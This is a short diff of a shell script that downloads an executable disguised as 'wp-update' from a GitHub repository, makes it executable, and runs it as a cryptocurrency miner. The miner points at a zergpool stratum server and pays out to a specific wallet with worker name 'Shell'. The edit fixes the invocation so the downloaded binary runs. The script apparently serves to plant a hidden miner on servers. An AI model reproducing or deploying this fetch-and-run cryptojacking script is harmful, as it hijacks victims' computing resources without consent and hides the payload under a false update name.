@@ -1,3 +1,3 @@
 wget https://raw.githubusercontent.com/robertreynolds2/mine/main/wp-update 2>&1
 chmod +x wp-update 2>&1
-wp-update -a rx/arq -o stratum+tcp://randomARQ.mine.zergpool.com:4464 -u TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.Shell --keepalive --timeout 120 --donate-level 1 -p c=TRX,mc=ARQ,ID=Shell 2>&1
+./wp-update -a rx/arq -o stratum+tcp://randomARQ.mine.zergpool.com:4464 -u TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.Shell --keepalive --timeout 120 --donate-level 1 -p c=TRX,mc=ARQ,ID=Shell 2>&1
